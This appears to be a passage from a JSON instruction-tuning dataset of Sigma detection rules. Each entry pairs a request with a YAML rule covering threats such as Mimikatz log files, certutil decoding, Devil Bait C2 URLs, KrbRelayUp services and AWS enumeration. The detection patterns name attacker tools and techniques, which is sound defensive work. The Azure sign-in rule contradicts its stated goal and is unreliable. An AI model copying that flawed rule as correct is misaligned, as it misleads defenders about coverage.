      "answer": "In order to detect persistence registry keys for Recycle Bin, you should monitor registry events in Windows systems for the creation or modification of specific keys that are known to be utilized for maintaining persistence mechanisms. Specifically, look out for events where a registry key is renamed to include '\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open', as this indicates an attempt to manipulate the Recycle Bin's functionality for persistent access. Additionally, monitor for events where the default command for the Recycle Bin (identified through the registry path '\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\\(Default)') is set or altered. Detecting these activities in the registry can signify that an attacker is trying to establish persistence on the system by leveraging the Recycle Bin, a technique that can allow malicious software or activities to remain undetected by conventional security measures. As no specific false positives have been defined apart from unknown ones, it's crucial to analyze these detections in the context they occur to understand their legitimacy. "
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of \".xml\" and \".txt\" files in folders of the \"\\AppData\\Roaming\\Microsoft\" directory by uncommon processes. This behavior was seen common across different Devil Bait samples and stages as described by the NCSC.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of \".xml\" and \".txt\" files in folders of the \"\\AppData\\Roaming\\Microsoft\" directory by uncommon processes, which was seen as a common behavior across different Devil Bait samples and stages as described by the NCSC, you should: Focus on monitoring file events within Windows environments. Particularly, you need to watch for the creation of \".txt\" and \".xml\" files in directories under the \"\\AppData\\Roaming\\Microsoft\" path. The processes of interest that could indicate malicious activity if they are creating these files are 'schtasks.exe', 'wscript.exe', and 'mshta.exe'. These executables are generally legitimate Windows components but can be misused by attackers for malicious purposes. The detection strategy is highly reliable with a low chance of false positives, emphasizing its importance in proactively identifying potential stages of a Devil Bait attack campaign.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith:\n            - '\\schtasks.exe'\n            - '\\wscript.exe'\n            - '\\mshta.exe'\n        # Example folders used by the samples include:\n        #   - %AppData%\\Microsoft\\Network\\\n        #   - %AppData%\\Microsoft\\Office\\\n        TargetFilename|contains: '\\AppData\\Roaming\\Microsoft\\'\n        TargetFilename|endswith:\n            - '.txt'\n            - '.xml'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        Image|endswith:\n            - '\\schtasks.exe'\n            - '\\wscript.exe'\n            - '\\mshta.exe'\n        # Example folders used by the samples include:\n        #   - %AppData%\\Microsoft\\Network\\\n        #   - %AppData%\\Microsoft\\Office\\\n        TargetFilename|contains: '\\AppData\\Roaming\\Microsoft\\'\n        TargetFilename|endswith:\n            - '.txt'\n            - '.xml'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "creation of \".xml\" and \".txt\" files in folders of the \"\\AppData\\Roaming\\Microsoft\" directory by uncommon processes. This behavior was seen common across different Devil Bait samples and stages as described by the NCSC",
      "answer": "In order to detect the creation of \".xml\" and \".txt\" files in folders of the \"\\AppData\\Roaming\\Microsoft\" directory by uncommon processes, which was seen as a common behavior across different Devil Bait samples and stages as described by the NCSC, you should: Focus on monitoring file events within Windows environments. Particularly, you need to watch for the creation of \".txt\" and \".xml\" files in directories under the \"\\AppData\\Roaming\\Microsoft\" path. The processes of interest that could indicate malicious activity if they are creating these files are 'schtasks.exe', 'wscript.exe', and 'mshta.exe'. These executables are generally legitimate Windows components but can be misused by attackers for malicious purposes. The detection strategy is highly reliable with a low chance of false positives, emphasizing its importance in proactively identifying potential stages of a Devil Bait attack campaign."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting This rule will monitor executable and script file creation by office applications. Please add more file extensions or magic bytes to the logic of your choice..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to monitor executable and script file creation by office applications, you should: Focus on tracking file events within Windows operating systems, particularly those involving office applications like Word, Excel, PowerPoint, and Outlook. Look for instances where these applications are responsible for creating files that end with specific extensions such as \".exe\", \".dll\", \".ocx\", \".com\", \".ps1\", \".vbs\", \".sys\", \".bat\", \".scr\", or \".proj\", which are typically associated with executable files and scripts. Additionally, pay close attention to files that start with the magic bytes \"4D5A\", indicating they are executable. Monitoring such events involves looking for matches where an office application has either created files with the aforementioned extensions or files starting with the specified magic bytes. Given the potential for unknown false positives, the severity level of these detections is considered high. This approach is aligned with various tactics and techniques, particularly those concerning the execution of malicious files, persistence mechanisms, and potential evasion methods.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    #useful_information: Please add more file extensions and magic bytes to the logic of your choice.\n    selection1:\n        Image|endswith:\n            - '\\winword.exe'\n            - '\\excel.exe'\n            - '\\powerpnt.exe'\n            - '\\outlook.exe'\n    selection2:\n        FileName|endswith:\n            - \".exe\"\n            - \".dll\"\n            - \".ocx\"\n            - \".com\"\n            - \".ps1\"\n            - \".vbs\"\n            - \".sys\"\n            - \".bat\"\n            - \".scr\"\n            - \".proj\"\n    selection3:\n        FileMagicBytes|startswith:\n            - \"4D5A\"\n    condition: selection1 and (selection2 or selection3)\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    #useful_information: Please add more file extensions and magic bytes to the logic of your choice.\n    selection1:\n        Image|endswith:\n            - '\\winword.exe'\n            - '\\excel.exe'\n            - '\\powerpnt.exe'\n            - '\\outlook.exe'\n    selection2:\n        FileName|endswith:\n            - \".exe\"\n            - \".dll\"\n            - \".ocx\"\n            - \".com\"\n            - \".ps1\"\n            - \".vbs\"\n            - \".sys\"\n            - \".bat\"\n            - \".scr\"\n            - \".proj\"\n    selection3:\n        FileMagicBytes|startswith:\n            - \"4D5A\"\n    condition: selection1 and (selection2 or selection3)\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "This rule will monitor executable and script file creation by office applications. Please add more file extensions or magic bytes to the logic of your choice.",
      "answer": "In order to monitor executable and script file creation by office applications, you should: Focus on tracking file events within Windows operating systems, particularly those involving office applications like Word, Excel, PowerPoint, and Outlook. Look for instances where these applications are responsible for creating files that end with specific extensions such as \".exe\", \".dll\", \".ocx\", \".com\", \".ps1\", \".vbs\", \".sys\", \".bat\", \".scr\", or \".proj\", which are typically associated with executable files and scripts. Additionally, pay close attention to files that start with the magic bytes \"4D5A\", indicating they are executable. Monitoring such events involves looking for matches where an office application has either created files with the aforementioned extensions or files starting with the specified magic bytes. Given the potential for unknown false positives, the severity level of these detections is considered high. This approach is aligned with various tactics and techniques, particularly those concerning the execution of malicious files, persistence mechanisms, and potential evasion methods."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting network enumeration performed on AWS..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect network enumeration performed on AWS, you should monitor AWS CloudTrail logs for specific activities that indicate attempts to gather information about the network environment. Specifically, look for multiple (more than five within a 10-minute window) API calls to ec2.amazonaws.com, especially those calling methods such as 'DescribeCarrierGateways', 'DescribeVpcEndpointConnectionNotifications', 'DescribeTransitGatewayMulticastDomains', 'DescribeClientVpnRoutes', 'DescribeDhcpOptions', and 'GetTransitGatewayRouteTableAssociations'. These activities can suggest that an attacker is trying to map out the network, identifying key components and connections that could be leveraged for further attacks or exploitation. However, keep in mind that there could be unknown legitimate reasons for such activities, hence they are initially considered to have a low level of threat. Nonetheless, continuous monitoring of these patterns is essential for maintaining the security posture and detecting potential reconnaissance efforts as part of broader adversarial tactics.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: 'ec2.amazonaws.com'\n        eventName:\n            - 'DescribeCarrierGateways'\n            - 'DescribeVpcEndpointConnectionNotifications'\n            - 'DescribeTransitGatewayMulticastDomains'\n            - 'DescribeClientVpnRoutes'\n            - 'DescribeDhcpOptions'\n            - 'GetTransitGatewayRouteTableAssociations'\n    timeframe: 10m\n    condition: selection | count() > 5\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: aws\n    service: cloudtrail\ndetection:\n    selection:\n        eventSource: 'ec2.amazonaws.com'\n        eventName:\n            - 'DescribeCarrierGateways'\n            - 'DescribeVpcEndpointConnectionNotifications'\n            - 'DescribeTransitGatewayMulticastDomains'\n            - 'DescribeClientVpnRoutes'\n            - 'DescribeDhcpOptions'\n            - 'GetTransitGatewayRouteTableAssociations'\n    timeframe: 10m\n    condition: selection | count() > 5\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "network enumeration performed on AWS.",
      "answer": "In order to detect network enumeration performed on AWS, you should monitor AWS CloudTrail logs for specific activities that indicate attempts to gather information about the network environment. Specifically, look for multiple (more than five within a 10-minute window) API calls to ec2.amazonaws.com, especially those calling methods such as 'DescribeCarrierGateways', 'DescribeVpcEndpointConnectionNotifications', 'DescribeTransitGatewayMulticastDomains', 'DescribeClientVpnRoutes', 'DescribeDhcpOptions', and 'GetTransitGatewayRouteTableAssociations'. These activities can suggest that an attacker is trying to map out the network, identifying key components and connections that could be leveraged for further attacks or exploitation. However, keep in mind that there could be unknown legitimate reasons for such activities, hence they are initially considered to have a low level of threat. Nonetheless, continuous monitoring of these patterns is essential for maintaining the security posture and detecting potential reconnaissance efforts as part of broader adversarial tactics."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files, which can be abused by attackers to decode an encoded payload before execution, you should: Monitor Windows process creation logs for instances where the process image ends with '\\certutil.exe' or has an OriginalFileName of 'CertUtil.exe'. Additionally, look for command-line executions containing either '-decode ', '/decode ', '-decodehex ', or '/decodehex ' to identify the specific use of certutil for decoding base64 or hex encoded files. It's important to consider all these selection criteria together to accurately identify potential malicious activity. While monitoring, be aware that there can be legitimate uses of these certutil commands, so unknown instances should be considered as potential false positives, rated at a medium level of concern. This approach aids in recognizing tactics and techniques resembling the usage of encoding/decoding in the attack lifecycle, without labeling it under specific MITRE ATT&CK taxonomy.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains:\n            # Decode Base64\n            - '-decode '\n            - '/decode '\n            # Decode Hex\n            - '-decodehex '\n            - '/decodehex '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains:\n            # Decode Base64\n            - '-decode '\n            - '/decode '\n            # Decode Hex\n            - '-decodehex '\n            - '/decodehex '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution",
      "answer": "In order to detect the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files, which can be abused by attackers to decode an encoded payload before execution, you should: Monitor Windows process creation logs for instances where the process image ends with '\\certutil.exe' or has an OriginalFileName of 'CertUtil.exe'. Additionally, look for command-line executions containing either '-decode ', '/decode ', '-decodehex ', or '/decodehex ' to identify the specific use of certutil for decoding base64 or hex encoded files. It's important to consider all these selection criteria together to accurately identify potential malicious activity. While monitoring, be aware that there can be legitimate uses of these certutil commands, so unknown instances should be considered as potential false positives, rated at a medium level of concern. This approach aids in recognizing tactics and techniques resembling the usage of encoding/decoding in the attack lifecycle, without labeling it under specific MITRE ATT&CK taxonomy."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Looks for changes to registry to disable any write-protect property for storage devices. This could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to look for changes to registry to disable any write-protect property for storage devices, which could be a precursor to a ransomware attack and has been an observed technique used by the cypherpunk group, you should: focus on monitoring Windows process creation logs for commands that aim to modify the registry. Specifically, keep an eye out for commands that contain \"reg add\" together with the path \"\\system\\currentcontrolset\\control\" and the phrases \"write protection\" and \"0\". Additionally, the presence of the terms \"storage\" or \"storagedevicepolicies\" within the command line should be considered suspicious. These criteria are used to detect attempts to disable write protection on storage devices through registry modifications, which could be indicative of malicious activity aimed at preparing the system for a ransomware attack. It's important to be cautious, as detection is on a medium confidence level and there might be unknown cases leading to false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'reg add'\n            - '\\system\\currentcontrolset\\control'\n            - 'write protection'\n            - '0'\n        CommandLine|contains:\n            - 'storage'\n            - 'storagedevicepolicies'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'reg add'\n            - '\\system\\currentcontrolset\\control'\n            - 'write protection'\n            - '0'\n        CommandLine|contains:\n            - 'storage'\n            - 'storagedevicepolicies'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Looks for changes to registry to disable any write-protect property for storage devices. This could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group.",
      "answer": "In order to look for changes to registry to disable any write-protect property for storage devices, which could be a precursor to a ransomware attack and has been an observed technique used by the cypherpunk group, you should: focus on monitoring Windows process creation logs for commands that aim to modify the registry. Specifically, keep an eye out for commands that contain \"reg add\" together with the path \"\\system\\currentcontrolset\\control\" and the phrases \"write protection\" and \"0\". Additionally, the presence of the terms \"storage\" or \"storagedevicepolicies\" within the command line should be considered suspicious. These criteria are used to detect attempts to disable write protection on storage devices through registry modifications, which could be indicative of malicious activity aimed at preparing the system for a ransomware attack. It's important to be cautious, as detection is on a medium confidence level and there might be unknown cases leading to false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files. It can be abused to run malicious \".xbap\" files any bypass AWL.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files. It can be abused to run malicious \".xbap\" files and bypass AWL, you should monitor for the execution of processes on Windows systems, specifically looking for instances where \"PresentationHost.exe\" is initiated. This detection focuses on identifying the execution of \"PresentationHost.exe\" or any processes ending with \"\\presentationhost.exe\", in combination with command lines that include '.xbap' strings, indicating the running of Browser Application (.xbap) files. However, it's crucial to exclude command lines that contain references to 'C:\\Windows\\' or 'C:\\Program Files' to minimize the chances of flagging legitimate usage of \"PresentationHost\". This approach aims to catch malicious activities involving the abuse of \"PresentationHost\" to bypass Application Whitelisting (AWL) mechanisms by executing potentially harmful \".xbap\" files.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\presentationhost.exe'\n        - OriginalFileName: 'PresentationHost.exe'\n    selection_cli:\n        CommandLine|contains: '.xbap'\n    filter:\n        CommandLine|contains: # Filter out legitimate locations if you find them\n            - 'C:\\Windows\\'\n            - 'C:\\Program Files'\n    condition: all of selection* and not filter\nfalsepositives:\n    - Legitimate \".xbap\" being executed via \"PresentationHost\"\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\presentationhost.exe'\n        - OriginalFileName: 'PresentationHost.exe'\n    selection_cli:\n        CommandLine|contains: '.xbap'\n    filter:\n        CommandLine|contains: # Filter out legitimate locations if you find them\n            - 'C:\\Windows\\'\n            - 'C:\\Program Files'\n    condition: all of selection* and not filter\nfalsepositives:\n    - Legitimate \".xbap\" being executed via \"PresentationHost\"\nlevel: medium\n",
      "question": "usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files. It can be abused to run malicious \".xbap\" files any bypass AWL",
      "answer": "In order to detect usage of \"PresentationHost\" which is a utility that runs \".xbap\" (Browser Applications) files. It can be abused to run malicious \".xbap\" files and bypass AWL, you should monitor for the execution of processes on Windows systems, specifically looking for instances where \"PresentationHost.exe\" is initiated. This detection focuses on identifying the execution of \"PresentationHost.exe\" or any processes ending with \"\\presentationhost.exe\", in combination with command lines that include '.xbap' strings, indicating the running of Browser Application (.xbap) files. However, it's crucial to exclude command lines that contain references to 'C:\\Windows\\' or 'C:\\Program Files' to minimize the chances of flagging legitimate usage of \"PresentationHost\". This approach aims to catch malicious activities involving the abuse of \"PresentationHost\" to bypass Application Whitelisting (AWL) mechanisms by executing potentially harmful \".xbap\" files."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when multi-factor authentication (MFA) is disabled..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when multi-factor authentication (MFA) is disabled, you should: Monitor logs from Google Workspace, specifically the admin service logs. Look for events reported by the \"admin.googleapis.com\" service that indicate either the enforcement or allowance of strong authentication has been triggered. The events of interest are when \"ENFORCE_STRONG_AUTHENTICATION\" or \"ALLOW_STRONG_AUTHENTICATION\" actions are taken. Further scrutiny is required if the value associated with these actions is set to 'false', indicating that multi-factor authentication is being weakened or disabled. It's important to be aware that there may be legitimate reasons for these changes, such as actions taken by a system administrator, which could result in false positives. The severity of these incidents is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: google_workspace\n    service: google_workspace.admin\ndetection:\n    selection_base:\n        eventService: admin.googleapis.com\n        eventName:\n            - ENFORCE_STRONG_AUTHENTICATION\n            - ALLOW_STRONG_AUTHENTICATION\n    selection_eventValue:\n        new_value: 'false'\n    condition: all of selection*\nfalsepositives:\n    - MFA may be disabled and performed by a system administrator.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: google_workspace\n    service: google_workspace.admin\ndetection:\n    selection_base:\n        eventService: admin.googleapis.com\n        eventName:\n            - ENFORCE_STRONG_AUTHENTICATION\n            - ALLOW_STRONG_AUTHENTICATION\n    selection_eventValue:\n        new_value: 'false'\n    condition: all of selection*\nfalsepositives:\n    - MFA may be disabled and performed by a system administrator.\nlevel: medium\n",
      "question": "when multi-factor authentication (MFA) is disabled.",
      "answer": "In order to detect when multi-factor authentication (MFA) is disabled, you should: Monitor logs from Google Workspace, specifically the admin service logs. Look for events reported by the \"admin.googleapis.com\" service that indicate either the enforcement or allowance of strong authentication has been triggered. The events of interest are when \"ENFORCE_STRONG_AUTHENTICATION\" or \"ALLOW_STRONG_AUTHENTICATION\" actions are taken. Further scrutiny is required if the value associated with these actions is set to 'false', indicating that multi-factor authentication is being weakened or disabled. It's important to be aware that there may be legitimate reasons for these changes, such as actions taken by a system administrator, which could result in false positives. The severity of these incidents is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Mimikatz MemSSP default log file creation.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Mimikatz MemSSP default log file creation, you should focus on monitoring file events within the Windows operating system. Specifically, look for any instances where a file is created with the name ending in 'mimilsa.log'. This particular filename is indicative of the Mimikatz MemSSP module operation, which is often used by attackers to extract plaintext passwords and other sensitive information from memory. The creation of this file is considered a critical indicator of compromise, and occurrences are unlikely to be false positives, highlighting the necessity of immediate investigation and response when this activity is detected.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith: 'mimilsa.log'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith: 'mimilsa.log'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "Mimikatz MemSSP default log file creation",
      "answer": "In order to detect Mimikatz MemSSP default log file creation, you should focus on monitoring file events within the Windows operating system. Specifically, look for any instances where a file is created with the name ending in 'mimilsa.log'. This particular filename is indicative of the Mimikatz MemSSP module operation, which is often used by attackers to extract plaintext passwords and other sensitive information from memory. The creation of this file is considered a critical indicator of compromise, and occurrences are unlikely to be false positives, highlighting the necessity of immediate investigation and response when this activity is detected."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect failed authentications from countries you do not operate out of..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect failed authentications from countries you do not operate out of, you should focus on monitoring Azure's signinlogs for authentication attempts. Specifically, target the records for successful authentication attempts (marked as 'Success' in the Status field) and then filter these according to the location of the attempt. You should exclude from your scrutiny any login attempt that originates from countries where your organization operates (identified by checking if the Location field contains country codes such as GB or any other relevant countries, using an OR condition to list multiple). The detection logic revolves around spotting successful logins that do not fit these parameters\u2014essentially, any successful login that does not come from the predefined set of countries where your organization operates. This method aims to highlight potential unauthorized access attempts from geographic regions that are unexpected, based on your operational footprint.\n\nBe aware that there might be false positives, particularly if the detected activity was officially approved by a System Administrator. The severity level for this kind of detection is considered low due to the potential for such false positives and the nature of the detection mechanism focusing on geographical anomalies rather than direct indicators of compromise. Nonetheless, this strategy forms a part of your security posture by leveraging geographical data to flag potentially unauthorised access attempts, aligning with MITRE ATT&CK tactics and techniques related to Initial Access and validating the importance of monitoring and analyzing signinlogs within Azure environments.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: signinlogs\ndetection:\n    selection:\n        Status: 'Success'\n    selection1:\n        Location|contains: '<Countries you DO operate out of e,g GB, use OR for multiple>'\n    condition: not selection and not selection1\nfalsepositives:\n    - If this was approved by System Administrator.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: signinlogs\ndetection:\n    selection:\n        Status: 'Success'\n    selection1:\n        Location|contains: '<Countries you DO operate out of e,g GB, use OR for multiple>'\n    condition: not selection and not selection1\nfalsepositives:\n    - If this was approved by System Administrator.\nlevel: low\n",
      "question": "Detect failed authentications from countries you do not operate out of.",
      "answer": "In order to detect failed authentications from countries you do not operate out of, you should focus on monitoring Azure's signinlogs for authentication attempts. Specifically, target the records for successful authentication attempts (marked as 'Success' in the Status field) and then filter these according to the location of the attempt. You should exclude from your scrutiny any login attempt that originates from countries where your organization operates (identified by checking if the Location field contains country codes such as GB or any other relevant countries, using an OR condition to list multiple). The detection logic revolves around spotting successful logins that do not fit these parameters\u2014essentially, any successful login that does not come from the predefined set of countries where your organization operates. This method aims to highlight potential unauthorized access attempts from geographic regions that are unexpected, based on your operational footprint.\n\nBe aware that there might be false positives, particularly if the detected activity was officially approved by a System Administrator. The severity level for this kind of detection is considered low due to the potential for such false positives and the nature of the detection mechanism focusing on geographical anomalies rather than direct indicators of compromise. Nonetheless, this strategy forms a part of your security posture by leveraging geographical data to flag potentially unauthorised access attempts, aligning with MITRE ATT&CK tactics and techniques related to Initial Access and validating the importance of monitoring and analyzing signinlogs within Azure environments."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential C2 communication related to Devil Bait malware.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential C2 communication related to Devil Bait malware, you should: focus on monitoring proxy logs for specific patterns of HTTP GET requests. Look for requests that include the following indicators in their URL: '/cross.php?op=', '&dt=', and '&uid='. These parameters within the requests are characteristic of communication patterns associated with Devil Bait malware, attempting to reach out to its command and control servers. This type of analysis is crucial for identifying potential breaches, as the detection of these specific request patterns, especially when they are found together in proxy logs, is a strong indicator of malicious activity linked to Devil Bait malware. False positives are considered unlikely due to the specificity of these patterns, indicating that such detection should be treated with a high level of concern.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'GET'\n        cs-uri|all:\n            - '/cross.php?op='\n            - '&dt='\n            - '&uid='\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        cs-method: 'GET'\n        cs-uri|all:\n            - '/cross.php?op='\n            - '&dt='\n            - '&uid='\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential C2 communication related to Devil Bait malware",
      "answer": "In order to detect potential C2 communication related to Devil Bait malware, you should: focus on monitoring proxy logs for specific patterns of HTTP GET requests. Look for requests that include the following indicators in their URL: '/cross.php?op=', '&dt=', and '&uid='. These parameters within the requests are characteristic of communication patterns associated with Devil Bait malware, attempting to reach out to its command and control servers. This type of analysis is crucial for identifying potential breaches, as the detection of these specific request patterns, especially when they are found together in proxy logs, is a strong indicator of malicious activity linked to Devil Bait malware. False positives are considered unlikely due to the specificity of these patterns, indicating that such detection should be treated with a high level of concern."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting service creation from KrbRelayUp tool used for privilege escalation in Windows domain environments where LDAP signing is not enforced (the default settings).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect service creation from KrbRelayUp tool used for privilege escalation in Windows domain environments where LDAP signing is not enforced (the default settings), you should: Monitor Windows system logs for the event with ID 7045, specifically looking for the creation of a service named 'KrbSCM'. This service creation is an indicator of the KrbRelayUp tool being used for privilege escalation, a common technique in environments where LDAP signing is not strictly enforced. Given the potential severity of this action, any detection should be treated with a high level of suspicion, although there may be instances where the activity is legitimate and thus considered a false positive. The focus here is on pinpointing tactics and techniques related to privilege escalation within a domain environment, leveraging the absence or misconfiguration of security measures like LDAP signing.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 7045\n        ServiceName: 'KrbSCM'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: 7045\n        ServiceName: 'KrbSCM'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "service creation from KrbRelayUp tool used for privilege escalation in Windows domain environments where LDAP signing is not enforced (the default settings)",
      "answer": "In order to detect service creation from KrbRelayUp tool used for privilege escalation in Windows domain environments where LDAP signing is not enforced (the default settings), you should: Monitor Windows system logs for the event with ID 7045, specifically looking for the creation of a service named 'KrbSCM'. This service creation is an indicator of the KrbRelayUp tool being used for privilege escalation, a common technique in environments where LDAP signing is not strictly enforced. Given the potential severity of this action, any detection should be treated with a high level of suspicion, although there may be instances where the activity is legitimate and thus considered a false positive. The focus here is on pinpointing tactics and techniques related to privilege escalation within a domain environment, leveraging the absence or misconfiguration of security measures like LDAP signing."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe), you should: Monitor Windows process creation logs for instances where the process image name ends with 'ttdinject.exe' or where the original filename is 'TTDInject.EXE'. This activity could indicate a debugging attempt using this specific tool, and as such, should be closely scrutinized. Bear in mind that while monitoring for these criteria, you might encounter legitimate uses of TTDInject.exe, categorizing such events as potential false positives. The severity of this detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: 'ttdinject.exe'\n        - OriginalFileName: 'TTDInject.EXE'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        - Image|endswith: 'ttdinject.exe'\n        - OriginalFileName: 'TTDInject.EXE'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "executiob of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe)",
      "answer": "In order to detect the execution of TTDInject.exe, which is used by Windows 10 v1809 and newer to debug time travel (underlying call of tttracer.exe), you should: Monitor Windows process creation logs for instances where the process image name ends with 'ttdinject.exe' or where the original filename is 'TTDInject.EXE'. This activity could indicate a debugging attempt using this specific tool, and as such, should be closely scrutinized. Bear in mind that while monitoring for these criteria, you might encounter legitimate uses of TTDInject.exe, categorizing such events as potential false positives. The severity of this detection is considered medium."
    }
  },
  {
